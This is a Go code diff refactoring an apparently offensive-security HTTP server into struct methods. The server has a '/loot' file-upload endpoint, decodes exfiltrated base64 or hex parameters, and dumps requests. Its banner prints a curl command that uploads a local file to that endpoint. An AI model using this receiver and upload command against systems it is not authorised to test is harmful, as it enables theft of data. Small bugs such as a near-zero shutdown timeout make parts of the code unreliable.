@@ -2,6 +2,7 @@ package goserver
 
 import (
 	"bytes"
+	"context"
 	"encoding/base64"
 	"encoding/hex"
 	"fmt"
@@ -48,13 +49,24 @@ type HTTPConfig struct {
 	CustomResponses map[string]string
 	JSONDoLog       bool
 	JSONLogFile     string
-	
+	Silent          bool
+	server          *http.Server
+	ctx             *context.Context
+	router          *mux.Router
+	Running         bool
 }
 
-var HttpCfg HTTPConfig
+// var HttpCfg HTTPConfig
+func New() *HTTPConfig {
+	ret := &HTTPConfig{}
+	ret.Headers = make(map[string]string)
+	ret.CustomResponses = make(map[string]string)
 
-func CheckAuth(r *http.Request) bool {
-	if !HttpCfg.DoAuth {
+	return ret
+}
+
+func (hc *HTTPConfig) CheckAuth(r *http.Request) bool {
+	if !hc.DoAuth {
 		return true
 	}
 
@@ -62,19 +74,19 @@ func CheckAuth(r *http.Request) bool {
 	if !ok {
 		return false
 	}
-	if u != HttpCfg.Username {
+	if u != hc.Username {
 		return false
 	}
-	if p != HttpCfg.Password {
+	if p != hc.Password {
 		return false
 	}
 	return true
 }
 
-func DropLoot(w http.ResponseWriter, r *http.Request) {
-	auth := CheckAuth(r)
-	DumpReq(w, r, auth)
-	LogRequest(r)
+func (hc *HTTPConfig) DropLoot(w http.ResponseWriter, r *http.Request) {
+	auth := hc.CheckAuth(r)
+	hc.DumpReq(w, r, auth)
+	hc.LogRequest(r)
 	if !auth {
 		return
 	}
@@ -94,17 +106,17 @@ func DropLoot(w http.ResponseWriter, r *http.Request) {
 		fmt.Println(err)
 	}
 
-	err = ioutil.WriteFile(HttpCfg.WorkDir+"/"+handler.Filename, fileBytes, 0644)
+	err = ioutil.WriteFile(hc.WorkDir+"/"+handler.Filename, fileBytes, 0644)
 	if err != nil {
-		fmt.Println(Red+"[ERROR] Failed to write local file:", HttpCfg.WorkDir+"/"+handler.Filename, Reset)
+		fmt.Println(Red+"[ERROR] Failed to write local file:", hc.WorkDir+"/"+handler.Filename, Reset)
 		return
 	}
 	fmt.Println(Green+"[+] Uploaded File:", handler.Filename, Reset)
 }
 
-func DumpReq(w http.ResponseWriter, req *http.Request, auth bool) {
+func (hc *HTTPConfig) DumpReq(w http.ResponseWriter, req *http.Request, auth bool) {
 	authmsg := ""
-	if HttpCfg.DoAuth {
+	if hc.DoAuth {
 		if auth {
 			authmsg = Green + "(Auth Valid)" + Reset
 		} else {
@@ -113,7 +125,7 @@ func DumpReq(w http.ResponseWriter, req *http.Request, auth bool) {
 
 	}
 	exmsg := ""
-	exfil := parseExfil(req)
+	exfil := hc.parseExfil(req)
 	log.Println(req.Method, "from", req.RemoteAddr+":", req.URL.Path, authmsg, exmsg)
 	if len(exfil) > 0 {
 		tmp := []string{}
@@ -122,9 +134,9 @@ func DumpReq(w http.ResponseWriter, req *http.Request, auth bool) {
 		}
 		fmt.Printf("     └─ Exfil data detected: %s\n", strings.Join(tmp, ",")) // ├  <<< if we need it.
 	}
-	if HttpCfg.Dump {
+	if hc.Dump {
 		qp := ""
-		query := parseParams(req.URL.RawQuery)
+		query := hc.parseParams(req.URL.RawQuery)
 
 		if len(req.URL.RawQuery) > 0 {
 			qp = "?" + query
@@ -150,7 +162,7 @@ func DumpReq(w http.ResponseWriter, req *http.Request, auth bool) {
 			fmt.Println(k + ": " + req.Header.Get(k))
 		}
 		fmt.Printf("\n\n")
-		tmpBody := parseParams(string(body))
+		tmpBody := hc.parseParams(string(body))
 
 		fmt.Println(tmpBody)
 		req.Body.Close() //  must close
@@ -162,7 +174,7 @@ func DumpReq(w http.ResponseWriter, req *http.Request, auth bool) {
 }
 
 // parseExfil returns a map of any GET/POST params that successfully decode from hex or base64.
-func parseExfil(req *http.Request) map[string]string {
+func (hc *HTTPConfig) parseExfil(req *http.Request) map[string]string {
 	ret := make(map[string]string)
 	data := req.URL.RawQuery
 	body, err := ioutil.ReadAll(req.Body)
@@ -193,7 +205,7 @@ func parseExfil(req *http.Request) map[string]string {
 }
 
 // parseParams handles replaceing hex or base64 decoded data in a dump.
-func parseParams(data string) string {
+func (hc *HTTPConfig) parseParams(data string) string {
 	parts := strings.Split(data, "&")
 	if len(parts) > 0 {
 		for _, set := range parts {
@@ -270,15 +282,15 @@ func isASCII(s string) bool {
 	}
 	return true
 }
-func ServeFiles(h http.Handler) http.Handler {
+func (hc *HTTPConfig) ServeFiles(h http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		auth := CheckAuth(r)
-		DumpReq(w, r, auth)
-		LogRequest(r)
+		auth := hc.CheckAuth(r)
+		hc.DumpReq(w, r, auth)
+		hc.LogRequest(r)
 		if !auth {
 			return
 		}
-		for k, v := range HttpCfg.Headers {
+		for k, v := range hc.Headers {
 			w.Header().Add(k, v)
 		}
 
@@ -286,19 +298,19 @@ func ServeFiles(h http.Handler) http.Handler {
 	})
 }
 
-func ServeRedir(w http.ResponseWriter, r *http.Request) {
-	auth := CheckAuth(r)
-	DumpReq(w, r, auth)
-	LogRequest(r)
-	http.Redirect(w, r, HttpCfg.RedirectURL, http.StatusSeeOther)
+func (hc *HTTPConfig) ServeRedir(w http.ResponseWriter, r *http.Request) {
+	auth := hc.CheckAuth(r)
+	hc.DumpReq(w, r, auth)
+	hc.LogRequest(r)
+	http.Redirect(w, r, hc.RedirectURL, http.StatusSeeOther)
 }
 
-func ServeCustom(w http.ResponseWriter, r *http.Request) {
-	auth := CheckAuth(r)
-	DumpReq(w, r, auth)
-	LogRequest(r)
-	log.Println("Request for", r.URL.Path, "reading response from:", HttpCfg.CustomResponses[r.URL.Path])
-	f, err := ioutil.ReadFile(HttpCfg.CustomResponses[r.URL.Path])
+func (hc *HTTPConfig) ServeCustom(w http.ResponseWriter, r *http.Request) {
+	auth := hc.CheckAuth(r)
+	hc.DumpReq(w, r, auth)
+	hc.LogRequest(r)
+	log.Println("Request for", r.URL.Path, "reading response from:", hc.CustomResponses[r.URL.Path])
+	f, err := ioutil.ReadFile(hc.CustomResponses[r.URL.Path])
 	if err != nil {
 		log.Fatal("err")
 	}
@@ -318,7 +330,8 @@ func ServeCustom(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte(prts[1])) // write body
 }
 
-func ListURLs(addr, port string, ssl bool) {
+func (hc *HTTPConfig) ListURLs(addr, port string, ssl bool) {
+
 	scheme := "http"
 	if ssl {
 		scheme = "https"
@@ -338,70 +351,77 @@ func ListURLs(addr, port string, ssl bool) {
 	fmt.Println()
 }
 
-func Run() {
-	fmt.Println(Blue + "[!] Upload URI: /loot (curl -F \"file=@./file.txt\" http[s]://address:port/loot)" + Reset)
-	fmt.Println(Blue + "[!] Special Params: base64 (GET/POST)" + Reset)
-	fmt.Println(Blue+"[!] Dump Requests:", HttpCfg.Dump, Reset)
-	fmt.Println(Blue+"[!] Auth Enabled:", HttpCfg.DoAuth, Reset)
-	fmt.Println(Blue+"[!] Working Directory:", HttpCfg.WorkDir, Reset)
-	fmt.Println(Blue+"[!] SSL Enabled:", HttpCfg.SSL, Reset)
-	ListURLs(HttpCfg.Addr, HttpCfg.Port, HttpCfg.SSL)
+func (hc *HTTPConfig) ShutDown() {
+	log.Println("Shutting down the HTTP/s server...")
+	hc.server.Shutdown(*hc.ctx)
+	hc.Running = false
+}
 
-	http.HandleFunc("/loot", DropLoot)
-	if HttpCfg.RedirectURL == "" {
-		http.Handle("/", ServeFiles(http.FileServer(http.Dir(HttpCfg.WorkDir))))
+func (hc *HTTPConfig) SetupRoutes() {
+	hc.router = mux.NewRouter()
+	hc.router.HandleFunc("/loot", hc.DropLoot)
+	if hc.RedirectURL == "" {
+		hc.router.Handle("/", hc.ServeFiles(http.FileServer(http.Dir(hc.WorkDir))))
 	} else {
-		http.HandleFunc("/", ServeRedir)
+		hc.router.HandleFunc("/", hc.ServeRedir)
 	}
 
-	if len(HttpCfg.CustomResponses) > 0 {
-		for k, _ := range HttpCfg.CustomResponses {
-			http.HandleFunc(k, ServeCustom)
+	if len(hc.CustomResponses) > 0 {
+		for k, _ := range hc.CustomResponses {
+			hc.router.HandleFunc(k, hc.ServeCustom)
 		}
 	}
+	hc.server.Handler = hc.router
+}
 
-	r := mux.NewRouter()
-	r.HandleFunc("/loot", DropLoot)
-	if HttpCfg.RedirectURL == "" {
-		r.Handle("/", ServeFiles(http.FileServer(http.Dir(HttpCfg.WorkDir))))
+func (hc *HTTPConfig) Run() {
+	if hc.SSL {
+		log.Println("Starting HTTPs at", hc.Addr+":"+hc.Port)
 	} else {
-		r.HandleFunc("/", ServeRedir)
+		log.Println("Starting HTTP at", hc.Addr+":"+hc.Port)
 	}
-	if len(HttpCfg.CustomResponses) > 0 {
-		for k, _ := range HttpCfg.CustomResponses {
-			r.HandleFunc(k, ServeCustom)
-		}
-	}
-	// http.Handle("/", r)
 
-	if HttpCfg.SSL {
-		if HttpCfg.SSLCert == "" || HttpCfg.SSLKey == "" {
+	if !hc.Silent {
+		fmt.Println(Blue + "[!] Upload URI: /loot (curl -F \"file=@./file.txt\" http[s]://address:port/loot)" + Reset)
+		fmt.Println(Blue + "[!] Special Params: base64 (GET/POST)" + Reset)
+		fmt.Println(Blue+"[!] Dump Requests:", hc.Dump, Reset)
+		fmt.Println(Blue+"[!] Auth Enabled:", hc.DoAuth, Reset)
+		fmt.Println(Blue+"[!] Working Directory:", hc.WorkDir, Reset)
+		fmt.Println(Blue+"[!] SSL Enabled:", hc.SSL, Reset)
+		hc.ListURLs(hc.Addr, hc.Port, hc.SSL)
+	}
+
+	hc.server = &http.Server{
+		Addr: hc.Addr + ":" + hc.Port,
+		// Handler: hc.router,
+	}
+	hc.SetupRoutes()
+	ctx, cancel := context.WithTimeout(context.Background(), 10)
+
+	defer cancel()
+	hc.ctx = &ctx
+	hc.Running = true
+	if hc.SSL {
+		if hc.SSLCert == "" || hc.SSLKey == "" {
 			tlsOptions := sslcert.DefaultOptions
-			tlsOptions.Host = HttpCfg.SSLDomain
+			tlsOptions.Host = hc.SSLDomain
 			tlsConfig, err := sslcert.NewTLSConfig(tlsOptions)
 			if err != nil {
-				log.Fatal(err)
+				log.Println(err)
 			}
-			server := &http.Server{
-				Addr:      HttpCfg.Addr + ":" + HttpCfg.Port,
-				TLSConfig: tlsConfig,
-				Handler:   r,
-			}
-
-			err = server.ListenAndServeTLS("", "")
-			if err != nil {
-				log.Fatal("ListenAndServeTLS: ", err)
-			}
-		} else {
-			err := http.ListenAndServeTLS(HttpCfg.Addr+":"+HttpCfg.Port, HttpCfg.SSLCert, HttpCfg.SSLKey, r)
-			if err != nil {
-				log.Fatal("ListenAndServeTLS: ", err)
-			}
+			hc.server.TLSConfig = tlsConfig
 		}
-	} else {
-		err := http.ListenAndServe(HttpCfg.Addr+":"+HttpCfg.Port, r)
+
+		err := hc.server.ListenAndServeTLS(hc.SSLCert, hc.SSLKey)
 		if err != nil {
-			log.Fatal("ListenAndServe: ", err)
+			log.Println("ListenAndServeTLS: ", err)
+		}
+
+	} else {
+		err := hc.server.ListenAndServe()
+		if err != nil {
+			log.Println("ListenAndServeTLS: ", err)
 		}
 	}
+	hc.Running = false
 }
